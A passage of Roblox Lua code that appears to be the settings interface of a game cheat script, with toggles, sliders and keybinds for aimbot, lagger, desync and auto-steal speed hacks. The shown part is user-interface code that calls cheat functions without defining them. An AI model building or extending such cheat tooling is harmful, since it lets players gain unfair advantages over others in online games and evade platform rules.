        l.Position = UDim2.new(0, 12, 0, 0)
        l.BackgroundTransparency = 1
        l.Text = txt
        l.TextColor3 = Color3.fromRGB(240, 240, 250)
        l.Font = Enum.Font.GothamBold
        l.TextSize = 14
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.TextTruncate = Enum.TextTruncate.AtEnd
        l.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        l.TextStrokeTransparency = 0.12
        l.ZIndex = 12
        return l
    end

    local function mkPill(row, offset)
        local pill = Instance.new("Frame", row)
        pill.Name = "ToggleSwitch"
        pill.AnchorPoint = Vector2.new(1, 0.5)
        pill.Position = UDim2.new(1, -(offset or 14), 0.5, 0)
        pill.Size = UDim2.new(0, 60, 0, 26)
        pill.BackgroundColor3 = Color3.fromRGB(17, 17, 23)
        pill.BorderSizePixel = 0
        pill.ZIndex = 8
        Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 13)

        local trackGradient = Instance.new("UIGradient", pill)
        trackGradient.Name = "SwitchTrackGradient"
        trackGradient.Rotation = 0
        trackGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(34, 23, 25)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 11, 16)),
        })

        local pillStroke = Instance.new("UIStroke", pill)
        pillStroke.Name = "PillStroke"
        pillStroke.Color = Color3.fromRGB(62, 43, 42)
        pillStroke.Thickness = 1.4
        pillStroke.Transparency = 0.22

        local statusLabel = Instance.new("TextLabel", pill)
        statusLabel.Name = "StatusLabel"
        statusLabel.Size = UDim2.new(1, 0, 1, 0)
        statusLabel.BackgroundTransparency = 1
        statusLabel.Font = Enum.Font.GothamBlack
        statusLabel.TextSize = 8
        statusLabel.Text = "OFF"
        statusLabel.TextColor3 = Color3.fromRGB(165, 145, 145)
        statusLabel.TextXAlignment = Enum.TextXAlignment.Right
        statusLabel.ZIndex = 9
        local pad = Instance.new("UIPadding", statusLabel)
        pad.PaddingRight = UDim.new(0, 4)
        pad.PaddingLeft = UDim.new(0, 4)

        local knob = Instance.new("Frame", pill)
        knob.Name = "Knob"
        knob.Size = UDim2.new(0, 18, 0, 18)
        knob.Position = UDim2.new(0, 4, 0.5, -9)
        knob.BackgroundColor3 = Color3.fromRGB(125, 128, 142)
        knob.BorderSizePixel = 0
        knob.ZIndex = 10
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local knobGradient = Instance.new("UIGradient", knob)
        knobGradient.Name = "KnobGradient"
        knobGradient.Rotation = 45
        knobGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 175, 190)),
        })

        local knobStroke = Instance.new("UIStroke", knob)
        knobStroke.Name = "KnobStroke"
        knobStroke.Color = Color3.fromRGB(65, 70, 85)
        knobStroke.Thickness = 1.2
        knobStroke.Transparency = 0.4

        local knobDot = Instance.new("Frame", knob)
        knobDot.Name = "Dot"
        knobDot.Size = UDim2.new(0, 5, 0, 5)
        knobDot.Position = UDim2.new(0.5, -2.5, 0.5, -2.5)
        knobDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knobDot.BackgroundTransparency = 0.6
        knobDot.BorderSizePixel = 0
        knobDot.ZIndex = 11
        Instance.new("UICorner", knobDot).CornerRadius = UDim.new(1, 0)

        return pill, knob
    end

    local function animPill(pill, dot, on, animate)
        if not pill or not dot then return end
        local tInfo = (animate == false) and TweenInfo.new(0.01) or TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
        local themeColor = getThemeColor() or Color3.fromRGB(255, 110, 20)
        local pillStroke = pill:FindFirstChild("PillStroke")
        local statusLabel = pill:FindFirstChild("StatusLabel")
        local knobStroke = dot:FindFirstChild("KnobStroke")
        local knobDot = dot:FindFirstChild("Dot")

        if on then
            TS:Create(dot, tInfo, {
                Position = UDim2.new(1, -22, 0.5, -9),
                BackgroundColor3 = themeColor
            }):Play()
            if knobStroke then
                TS:Create(knobStroke, tInfo, {
                    Color = Color3.fromRGB(255, 255, 255),
                    Thickness = 1.3,
                    Transparency = 0.1
                }):Play()
            end
            if knobDot then
                TS:Create(knobDot, tInfo, {
                    BackgroundTransparency = 0.2
                }):Play()
            end
            TS:Create(pill, tInfo, {
                BackgroundColor3 = themeColor:Lerp(Color3.fromRGB(0,0,0), 0.68)
            }):Play()
            if pillStroke then
                TS:Create(pillStroke, tInfo, {
                    Color = themeColor,
                    Thickness = 2.0,
                    Transparency = 0.02
                }):Play()
            end
            if statusLabel then
                statusLabel.Text = "ON"
                statusLabel.TextColor3 = themeColor
                statusLabel.TextXAlignment = Enum.TextXAlignment.Left
            end
        else
            TS:Create(dot, tInfo, {
                Position = UDim2.new(0, 4, 0.5, -9),
                BackgroundColor3 = Color3.fromRGB(125, 128, 142)
            }):Play()
            if knobStroke then
                TS:Create(knobStroke, tInfo, {
                    Color = Color3.fromRGB(65, 70, 85),
                    Thickness = 1.2,
                    Transparency = 0.4
                }):Play()
            end
            if knobDot then
                TS:Create(knobDot, tInfo, {
                    BackgroundTransparency = 0.6
                }):Play()
            end
            TS:Create(pill, tInfo, {
                BackgroundColor3 = Color3.fromRGB(16, 17, 22)
            }):Play()
            if pillStroke then
                TS:Create(pillStroke, tInfo, {
                    Color = Color3.fromRGB(62, 43, 42),
                    Thickness = 1.2,
                    Transparency = 0.35
                }):Play()
            end
            if statusLabel then
                statusLabel.Text = "OFF"
                statusLabel.TextColor3 = Color3.fromRGB(180, 155, 155)
                statusLabel.TextXAlignment = Enum.TextXAlignment.Right
            end
        end
    end

    -- mkToggle: returns setVisual. expandCb (optional) = called when arrow clicked
    local function mkToggle(page, txt, cb, expandCb)
        local row = mkRow(page, 48)
        local originalPageName = "Speed"
        for pageName, pageObject in pairs(contentPages) do
            if pageObject == page then originalPageName = pageName; break end
        end
        local countKey = originalPageName .. "::" .. tostring(txt)
        customRowLabelCounts[countKey] = (customRowLabelCounts[countKey] or 0) + 1
        local rowId = countKey .. "::" .. tostring(customRowLabelCounts[countKey])
        local rowMeta = {
            id = rowId,
            label = tostring(txt),
            row = row,
            originalPage = page,
            originalPageName = originalPageName,
            originalOrder = row.LayoutOrder,
            movable = (expandCb == nil),
        }
        table.insert(customRows, rowMeta)
        customRowsById[rowId] = rowMeta
        row:SetAttribute("ViperCustomRowId", rowId)
        rowMeta.labelObject = mkLabel(row, txt)

        -- Optional expand arrow button (placed left of the pill)
        local arrowBtn = nil
        local arrowOpen = false
        if expandCb then
            arrowBtn = Instance.new("TextButton", row)
            arrowBtn.Name = "ExpandArrow"
            arrowBtn.AnchorPoint = Vector2.new(1, 0.5)
            arrowBtn.Position = UDim2.new(1, -78, 0.5, 0)
            arrowBtn.Size = UDim2.new(0, 18, 0, 18)
            arrowBtn.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
            arrowBtn.BackgroundTransparency = 0.2
            arrowBtn.BorderSizePixel = 0
            arrowBtn.Text = "▶"
            arrowBtn.TextColor3 = getThemeColor()
            arrowBtn.Font = Enum.Font.GothamBlack
            arrowBtn.TextSize = 10
            arrowBtn.AutoButtonColor = false
            arrowBtn.ZIndex = 14
            Instance.new("UICorner", arrowBtn).CornerRadius = UDim.new(0, 6)
            local arrowStroke = Instance.new("UIStroke", arrowBtn)
            arrowStroke.Color = getThemeColor()
            arrowStroke.Thickness = 1.2
            arrowStroke.Transparency = 0.4
            arrowBtn.MouseButton1Click:Connect(function()
                arrowOpen = not arrowOpen
                arrowBtn.Text = arrowOpen and "▼" or "▶"
                expandCb(arrowOpen)
            end)
        end

        local pill, dot = mkPill(row, 12)
        local on = false
        local function sv(s) on = s; animPill(pill, dot, s, true) end
        local clk = Instance.new("TextButton", pill)
        clk.Size = UDim2.new(1,0,1,0)
        clk.BackgroundTransparency = 1
        clk.Text = ""
        clk.AutoButtonColor = false
        clk.ZIndex = 15
        clk.MouseEnter:Connect(function()
            local stroke = pill:FindFirstChild("PillStroke")
            if stroke then
                TS:Create(stroke, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Transparency = on and 0.02 or 0.12,
                    Color = on and (getThemeColor() or Color3.fromRGB(255, 110, 20)) or Color3.fromRGB(255, 135, 45)
                }):Play()
            end
            TS:Create(pill, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundTransparency = 0
            }):Play()
        end)
        clk.MouseLeave:Connect(function()
            local stroke = pill:FindFirstChild("PillStroke")
            if stroke then
                TS:Create(stroke, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Transparency = on and 0.02 or 0.35,
                    Color = on and (getThemeColor() or Color3.fromRGB(255, 110, 20)) or Color3.fromRGB(72, 52, 48)
                }):Play()
            end
            TS:Create(pill, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundTransparency = 0
            }):Play()
        end)
        clk.MouseButton1Down:Connect(function()
            TS:Create(pill, TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 56, 0, 24)
            }):Play()
        end)
        clk.MouseButton1Up:Connect(function()
            TS:Create(pill, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 60, 0, 26)
            }):Play()
        end)
        clk.MouseButton1Click:Connect(function()
            on = not on
            sv(on)
            -- Quick glow pulse on the switch after every state change.
            local stroke = pill:FindFirstChild("PillStroke")
            if stroke then
                local activeColor = on and (getThemeColor() or Color3.fromRGB(255, 110, 20)) or Color3.fromRGB(72, 52, 48)
                TS:Create(stroke, TweenInfo.new(0.09), {Thickness = 2.2, Color = activeColor, Transparency = 0}):Play()
                task.delay(0.13, function()
                    if stroke and stroke.Parent then
                        TS:Create(stroke, TweenInfo.new(0.2), {Thickness = on and 1.8 or 1.2, Transparency = on and 0.02 or 0.35}):Play()
                    end
                end)
            end
            pcall(cb, on)
            task.defer(function() pcall(saveAllSettings) end)
        end)
        return sv
    end

    local function mkSelector(parent, default, options, cb)
        local container = Instance.new("Frame", parent)
        container.Size = UDim2.new(0, 160, 1, 0)
        container.Position = UDim2.new(1, -168, 0, 0)
        container.BackgroundTransparency = 1
        container.ZIndex = 8
        local leftBtn = Instance.new("TextButton", container)
        leftBtn.Size = UDim2.new(0, 28, 0, 26)
        leftBtn.Position = UDim2.new(0, 0, 0.5, -13)
        leftBtn.BackgroundColor3 = INP
        leftBtn.BackgroundTransparency = 0.7
        leftBtn.BorderSizePixel = 0
        leftBtn.Text = "<"
        leftBtn.TextColor3 = WHITE
        leftBtn.Font = Enum.Font.GothamBold
        leftBtn.TextSize = 13
        leftBtn.AutoButtonColor = false
        leftBtn.ZIndex = 9
        Instance.new("UICorner", leftBtn).CornerRadius = UDim.new(0, 6)
        local label = Instance.new("TextLabel", container)
        label.Size = UDim2.new(0, 80, 0, 26)
        label.Position = UDim2.new(0.5, -40, 0.5, -13)
        label.BackgroundTransparency = 1
        label.Text = default
        label.TextColor3 = WHITE
        label.Font = Enum.Font.GothamBold
        label.TextSize = 12
        label.TextXAlignment = Enum.TextXAlignment.Center
        label.ZIndex = 9
        local rightBtn = Instance.new("TextButton", container)
        rightBtn.Size = UDim2.new(0, 28, 0, 26)
        rightBtn.Position = UDim2.new(1, -28, 0.5, -13)
        rightBtn.BackgroundColor3 = INP
        rightBtn.BackgroundTransparency = 0.7
        rightBtn.BorderSizePixel = 0
        rightBtn.Text = ">"
        rightBtn.TextColor3 = WHITE
        rightBtn.Font = Enum.Font.GothamBold
        rightBtn.TextSize = 13
        rightBtn.AutoButtonColor = false
        rightBtn.ZIndex = 9
        Instance.new("UICorner", rightBtn).CornerRadius = UDim.new(0, 6)
        local function updateLabel(newText) label.Text = newText end
        leftBtn.MouseButton1Click:Connect(function()
            if cb then cb(-1, updateLabel); task.defer(function() pcall(saveAllSettings) end) end
        end)
        rightBtn.MouseButton1Click:Connect(function()
            if cb then cb(1, updateLabel); task.defer(function() pcall(saveAllSettings) end) end
        end)
        return label
    end


    local function mkExpandableSlider(parent, title, min, max, default, cb)
        local row = Instance.new("Frame", parent)
        row.Size = UDim2.new(1, 0, 0, 44)
        row.BackgroundTransparency = 1
        row.ClipsDescendants = true
        
        local topRow = Instance.new("Frame", row)
        topRow.Size = UDim2.new(1, 0, 0, 44)
        topRow.BackgroundTransparency = 1
        
        local lbl = Instance.new("TextLabel", topRow)
        lbl.Size = UDim2.new(0.5, 0, 1, 0)
        lbl.Position = UDim2.new(0, 15, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = title
        lbl.TextColor3 = Color3.fromRGB(180, 180, 190)
        lbl.Font = Enum.Font.GothamMedium
        lbl.TextSize = 13
        lbl.TextXAlignment = Enum.TextXAlignment.Left

        local clickBtn = Instance.new("TextButton", topRow)
        clickBtn.Size = UDim2.new(0, 60, 0, 26)
        clickBtn.Position = UDim2.new(1, -75, 0.5, -13)
        clickBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 34)
        clickBtn.Text = "CLICK"
        clickBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        clickBtn.Font = Enum.Font.GothamBold
        clickBtn.TextSize = 11
        Instance.new("UICorner", clickBtn).CornerRadius = UDim.new(0, 6)
        local btnStroke = Instance.new("UIStroke", clickBtn)
        btnStroke.Color = Color3.fromRGB(60, 60, 70)

        local sliderArea = Instance.new("Frame", row)
        sliderArea.Size = UDim2.new(1, -30, 0, 40)
        sliderArea.Position = UDim2.new(0, 15, 0, 44)
        sliderArea.BackgroundTransparency = 1

        local line = Instance.new("Frame", sliderArea)
        line.Size = UDim2.new(1, -40, 0, 4)
        line.Position = UDim2.new(0, 0, 0.5, -2)
        line.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        Instance.new("UICorner", line).CornerRadius = UDim.new(1, 0)
        
        local valLbl = Instance.new("TextLabel", sliderArea)
        valLbl.Size = UDim2.new(0, 30, 1, 0)
        valLbl.Position = UDim2.new(1, -30, 0, 0)
        valLbl.BackgroundTransparency = 1
        valLbl.Text = tostring(default)
        valLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        valLbl.Font = Enum.Font.GothamBold
        valLbl.TextSize = 12

        local fill = Instance.new("Frame", line)
        fill.Name = "SliderFill"
        fill.Size = UDim2.new(math.clamp((default - min)/(max - min), 0, 1), 0, 1, 0)
        fill.BackgroundColor3 = getThemeColor()
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("TextButton", line)
        knob.Name = "SliderKnob"
        knob.Size = UDim2.new(0, 14, 0, 14)
        knob.Position = UDim2.new(math.clamp((default - min)/(max - min), 0, 1), -7, 0.5, -7)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.Text = ""
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local isOpen = false
        clickBtn.MouseButton1Click:Connect(function()
            isOpen = not isOpen
            TS:Create(row, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 0, isOpen and 84 or 44)}):Play()
            if animC then animC(clickBtn, "BackgroundColor3", isOpen and getThemeColor() or Color3.fromRGB(26, 26, 34)) end
        end)

        local dragging = false
        local dragLineStartX, dragLineStartWidth
        local function updateSlider(inp)
            local lineX = dragging and dragLineStartX or line.AbsolutePosition.X
            local lineWidth = math.max(1, dragging and dragLineStartWidth or line.AbsoluteSize.X)
            local rel = math.clamp((inp.Position.X - lineX) / lineWidth, 0, 1)
            local val = math.floor(min + (max - min) * rel + 0.5)
            valLbl.Text = tostring(val)
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, -7, 0.5, -7)
            if cb then cb(val) end
        end

        local function beginSliderDrag(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                -- Freeze the starting track geometry; UI Scale changes the track size while dragging.
                dragLineStartX = line.AbsolutePosition.X
                dragLineStartWidth = math.max(1, line.AbsoluteSize.X)
                -- Tapping anywhere on the slider track immediately applies that value.
                updateSlider(inp)
            end
        end
        knob.InputBegan:Connect(beginSliderDrag)
        line.InputBegan:Connect(beginSliderDrag)
        UIS.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    dragging = false
                    task.defer(function() pcall(saveAllSettings) end)
                end
            end
        end)
        UIS.InputChanged:Connect(function(inp)
            if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
                updateSlider(inp)
            end
        end)
        
        return function(newVal)
            local rel = math.clamp((newVal - min) / (max - min), 0, 1)
            valLbl.Text = tostring(newVal)
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, -7, 0.5, -7)
        end
    end

    local function mkBox(parent, default, w, xOff, cb)
        local tb = Instance.new("TextBox", parent)
        local bw = w or 50
        local xo = math.max(xOff or 56, bw + 12)
        tb.Size = UDim2.new(0, bw, 0, 24)
        tb.Position = UDim2.new(1, -xo, 0.5, -12)
        tb.BackgroundColor3 = INP
        tb.BackgroundTransparency = 0.7
        tb.BorderSizePixel = 0
        tb.Text = tostring(default)
        tb.TextColor3 = WHITE
        tb.Font = Enum.Font.GothamBold
        tb.TextSize = 11
        tb.ClearTextOnFocus = false
        tb.ZIndex = 8
        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 6)
        local bs = Instance.new("UIStroke", tb)
        bs.Color = ROW_BORDER
        bs.Thickness = 1.2
        bs.Transparency = 0.25
        tb.Focused:Connect(function() TS:Create(bs, TweenInfo.new(0.12), {Color = getThemeColor(), Transparency = 0}):Play() end)
        tb.FocusLost:Connect(function()
            TS:Create(bs, TweenInfo.new(0.12), {Color = ROW_BORDER, Transparency = 0.25}):Play()
            if cb then
                local n = tonumber(tb.Text)
                if n then cb(n) else tb.Text = tostring(default) end
                task.defer(function() saveAllSettings() end)
            end
        end)
        return tb
    end

    local function mkKeyButton(parent, kbEntry)
        local btn = Instance.new("TextButton", parent)
        btn.Size = UDim2.new(0, 84, 0, 26)
        btn.Position = UDim2.new(1, -92, 0.5, -13)
        btn.BackgroundColor3 = Color3.fromRGB(28, 25, 34)
        btn.BackgroundTransparency = 0.08
        btn.BorderSizePixel = 0
        local function getLabel()
            return (kbEntry.gp and kbEntry.gp.Name) or (kbEntry.kb and kbEntry.kb.Name) or "None"
        end
        local function refreshLabel()
            btn.Text = getLabel()
            btn.TextColor3 = (btn.Text == "None") and Color3.fromRGB(160, 160, 172) or WHITE
        end
        refreshLabel()
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        btn.ZIndex = 8
        btn.AutoButtonColor = false
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        local bs = Instance.new("UIStroke", btn)
        bs.Color = (btn.Text == "None") and ROW_BORDER or getThemeColor()
        bs.Thickness = 1.1
        bs.Transparency = 0.18

        local listening = false
        local inputConnection
        local previousLabel = btn.Text
        local listenStart = 0

        local function stopListening()
            listening = false
            _anyKeyListening = false
            if inputConnection then
                inputConnection:Disconnect()
                inputConnection = nil
            end
        end

        btn.MouseEnter:Connect(function()
            TS:Create(btn, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundColor3 = Color3.fromRGB(43, 35, 48),
                BackgroundTransparency = 0
            }):Play()
            TS:Create(bs, TweenInfo.new(0.14), {Color = getThemeColor(), Transparency = 0}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TS:Create(btn, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundColor3 = Color3.fromRGB(28, 25, 34),
                BackgroundTransparency = 0.08
            }):Play()
            TS:Create(bs, TweenInfo.new(0.14), {
                Color = (getLabel() == "None") and ROW_BORDER or getThemeColor(),
                Transparency = 0.18
            }):Play()
        end)

        btn.Activated:Connect(function()
            -- Clicking an assigned key clears it immediately. Click again to assign a new key.
            if listening then
                stopListening()
                refreshLabel()
                return
            end

            if kbEntry.kb or kbEntry.gp then
                kbEntry.kb = nil
                kbEntry.gp = nil
                stopListening()
                refreshLabel()
                bs.Color = ROW_BORDER
                task.defer(function() saveAllSettings(true) end)
                return
            end

            previousLabel = "None"
            listening = true
            _anyKeyListening = true
            listenStart = _tick()
            btn.Text = "Press key..."
            btn.TextColor3 = getThemeColor()
            TS:Create(bs, TweenInfo.new(0.12), {Color = getThemeColor(), Thickness = 1.6, Transparency = 0}):Play()

            inputConnection = UIS.InputBegan:Connect(function(inp)
                if not listening then return end
                if inp.KeyCode == Enum.KeyCode.Escape then
                    stopListening()
                    refreshLabel()
                    return
                end
                local isGp = isGamepadInput(inp)
                if isGp and _tick() - listenStart < 0.15 then return end
                if not isBindableInput(inp) then return end

                if isGp then
                    kbEntry.gp = inp.KeyCode
                    kbEntry.kb = nil
                else
                    kbEntry.kb = inp.KeyCode
                    kbEntry.gp = nil
                end
                stopListening()
                refreshLabel()
                bs.Color = getThemeColor()
                task.defer(function() saveAllSettings(true) end)
            end)
        end)

        table.insert(keyButtonRefs, {btn = btn, entry = kbEntry})
        return btn
    end

    local function addKeybindRow(page, labelText, kbEntry)
        local row = mkRow(page, 40)
        mkLabel(row, labelText)
        mkKeyButton(row, kbEntry)
    end

    local speedPage = contentPages["Speed"]

    -- Section 1: SPEED (Card layout matching Photo 2!)
    mkSect(speedPage, "SPEED")

    local function mkSpeedCard(title, valAimbot, valNormal, valSteal, onAimbot, onNormal, onSteal)
        local card = mkRow(speedPage, 54)
        local lbl = Instance.new("TextLabel", card)
        lbl.Size = UDim2.new(0, 110, 1, 0)
        lbl.Position = UDim2.new(0, 12, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = title
        lbl.TextColor3 = WHITE
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 8

        local function mkCol(colTitle, val, xOffset, cb)
            local colLbl = Instance.new("TextLabel", card)
            colLbl.Size = UDim2.new(0, 48, 0, 12)
            colLbl.Position = UDim2.new(1, xOffset, 0, 6)
            colLbl.BackgroundTransparency = 1
            colLbl.Text = colTitle
            colLbl.TextColor3 = Color3.fromRGB(150, 150, 160)
            colLbl.Font = Enum.Font.GothamMedium
            colLbl.TextSize = 9
            colLbl.TextXAlignment = Enum.TextXAlignment.Center
            colLbl.ZIndex = 8

            local tb = Instance.new("TextBox", card)
            tb.Size = UDim2.new(0, 48, 0, 24)
            tb.Position = UDim2.new(1, xOffset, 0, 20)
            tb.BackgroundColor3 = INP
            tb.BackgroundTransparency = 0.6
            tb.BorderSizePixel = 0
            tb.Text = tostring(val)
            tb.TextColor3 = WHITE
            tb.Font = Enum.Font.GothamBold
            tb.TextSize = 11
            tb.ClearTextOnFocus = false
            tb.ZIndex = 8
            Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 6)
            local bs = Instance.new("UIStroke", tb)
            bs.Color = ROW_BORDER
            bs.Thickness = 1
            bs.Transparency = 0.3
            tb.Focused:Connect(function() TS:Create(bs, TweenInfo.new(0.12), {Color = getThemeColor(), Transparency = 0}):Play() end)
            tb.FocusLost:Connect(function()
                TS:Create(bs, TweenInfo.new(0.12), {Color = ROW_BORDER, Transparency = 0.3}):Play()
                local n = tonumber(tb.Text)
                if n and cb then cb(n) else tb.Text = tostring(val) end
                task.defer(function() saveAllSettings() end)
            end)
            return tb
        end

        local bAimbot = mkCol("aimbot", valAimbot, -164, onAimbot)
        local bNormal = mkCol("normal", valNormal, -110, onNormal)
        local bSteal = mkCol("steal", valSteal, -56, onSteal)
        return card, bAimbot, bNormal, bSteal
    end

    -- Row 1: Normal Speed (aimbot, normal, steal)
    local cNorm, normAimBox, normBox, normStealBox = mkSpeedCard("Normal Speed", BAT_AIMBOT_SPEED, NS, CS,
        function(v)
            if v > 0 and v <= 500 then
                BAT_AIMBOT_SPEED = v
                if lagAimBox then lagAimBox.Text = tostring(v) end
                if desAimBox then desAimBox.Text = tostring(v) end
                if batSpeedBox then batSpeedBox.Text = tostring(v) end
            end
        end,
        function(v) if v > 0 and v <= 500 then NS = v; if normalTopBox then normalTopBox.Text = tostring(v) end; if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end end end,
        function(v) if v > 0 and v <= 500 then CS = v; if stealTopBox then stealTopBox.Text = tostring(v) end; if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end end end
    )
    normalBox = normBox
    carryBox = normStealBox

    -- Row 2: Lagger Speed (aimbot, normal, steal)
    local cLag, lagAimBox, lagBox, lagStealBox = mkSpeedCard("Lagger Speed", BAT_AIMBOT_SPEED, LAGGER_SPEED, LAGGER_CARRY_SPEED,
        function(v)
            if v > 0 and v <= 500 then
                BAT_AIMBOT_SPEED = v
                if normAimBox then normAimBox.Text = tostring(v) end
                if desAimBox then desAimBox.Text = tostring(v) end
                if batSpeedBox then batSpeedBox.Text = tostring(v) end
            end
        end,
        function(v) if v > 0 and v <= 500 then LAGGER_SPEED = v; if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end end end,
        function(v) if v > 0 and v <= 500 then LAGGER_CARRY_SPEED = v; if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end end end
    )
    laggerBox = lagBox
    lagger2Box = lagStealBox

    -- Row 3: Desync Speed (aimbot, normal, steal)
    local cDesync, dAim, dBox, dStealBox = mkSpeedCard("Desync Speed", BAT_AIMBOT_SPEED, DESYNC_SPEED, DESYNC_STEAL_SPEED,
        function(v)
            if v > 0 and v <= 500 then
                BAT_AIMBOT_SPEED = v
                if normAimBox then normAimBox.Text = tostring(v) end
                if lagAimBox then lagAimBox.Text = tostring(v) end
                if desAimBox then desAimBox.Text = tostring(v) end
                if batSpeedBox then batSpeedBox.Text = tostring(v) end
                task.defer(function() pcall(saveAllSettings) end)
            end
        end,
        function(v)
            if v > 0 and v <= 500 then
                DESYNC_SPEED = v
                if desBox then desBox.Text = tostring(v) end
                if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
                task.defer(function() pcall(saveAllSettings) end)
            end
        end,
        function(v)
            if v > 0 and v <= 500 then
                DESYNC_STEAL_SPEED = v
                if desStealBox then desStealBox.Text = tostring(v) end
                if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
                task.defer(function() pcall(saveAllSettings) end)
            end
        end
    )
    desAimBox = dAim
    desBox = dBox
    desStealBox = dStealBox

    -- Section 2: MOVEMENT
    mkSect(speedPage, "MOVEMENT")

    -- 1. Steal Speed
    stealSpeedSetVisual = mkToggle(speedPage, "Steal Speed", function(on)
        speedMode = on
        -- Keep the user's configured Normal/Steal values visible in the top bar.
        if normalTopBox then normalTopBox.Text = tostring(NS) end
        if stealTopBox then stealTopBox.Text = tostring(CS) end
        resetMovementState()
        if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
        task.defer(function() pcall(saveAllSettings) end)
    end)

    -- 2. Auto Steal Speed (Keep pbFrame visible!)
    autoStealSpeedSetVisual = mkToggle(speedPage, "Auto Steal Speed", function(on)
        CONFIG.AUTO_STEAL_ENABLED = on
        updateProgressBarVisibility()
        if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
    end)

    -- 3. Smooth Stealing with speed input box next to it!
    do
        local row = mkRow(speedPage, 44)
        mkLabel(row, "Smooth Stealing")

        local rightContainer = Instance.new("Frame", row)
        rightContainer.Size = UDim2.new(0, 140, 1, 0)
        rightContainer.Position = UDim2.new(1, -148, 0, 0)
        rightContainer.BackgroundTransparency = 1
        rightContainer.ZIndex = 8

        local spdLbl = Instance.new("TextLabel", rightContainer)
        spdLbl.Size = UDim2.new(0, 26, 0, 22)
        spdLbl.Position = UDim2.new(0, 0, 0.5, -11)
        spdLbl.BackgroundTransparency = 1
        spdLbl.Text = "speed"
        spdLbl.TextColor3 = Color3.fromRGB(150, 150, 165)
        spdLbl.Font = Enum.Font.GothamMedium
        spdLbl.TextSize = 10
        spdLbl.ZIndex = 9

        local spdBox = Instance.new("TextBox", rightContainer)
        spdBox.Size = UDim2.new(0, 44, 0, 22)
        spdBox.Position = UDim2.new(0, 28, 0.5, -11)
        spdBox.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
        spdBox.BackgroundTransparency = 0.2
        spdBox.BorderSizePixel = 0
        spdBox.Text = tostring(CONFIG.SMOOTH_STEAL_SPEED or 28)
        spdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        spdBox.Font = Enum.Font.GothamBold
        spdBox.TextSize = 11
        spdBox.ClearTextOnFocus = false
        spdBox.ZIndex = 9
        Instance.new("UICorner", spdBox).CornerRadius = UDim.new(0, 6)
        local boxStroke = Instance.new("UIStroke", spdBox)
        boxStroke.Color = Color3.fromRGB(62, 43, 42)
        boxStroke.Thickness = 1

        spdBox.Focused:Connect(function()
            TS:Create(boxStroke, TweenInfo.new(0.12), {Color = getThemeColor(), Thickness = 1.2}):Play()
        end)
        spdBox.FocusLost:Connect(function()
            TS:Create(boxStroke, TweenInfo.new(0.12), {Color = Color3.fromRGB(62, 43, 42), Thickness = 1}):Play()
            local v = tonumber(spdBox.Text)
            if v and v > 0 and v <= 500 then
                CONFIG.SMOOTH_STEAL_SPEED = v
                task.defer(function() pcall(saveAllSettings) end)
            else
                spdBox.Text = tostring(CONFIG.SMOOTH_STEAL_SPEED or 28)
            end
        end)
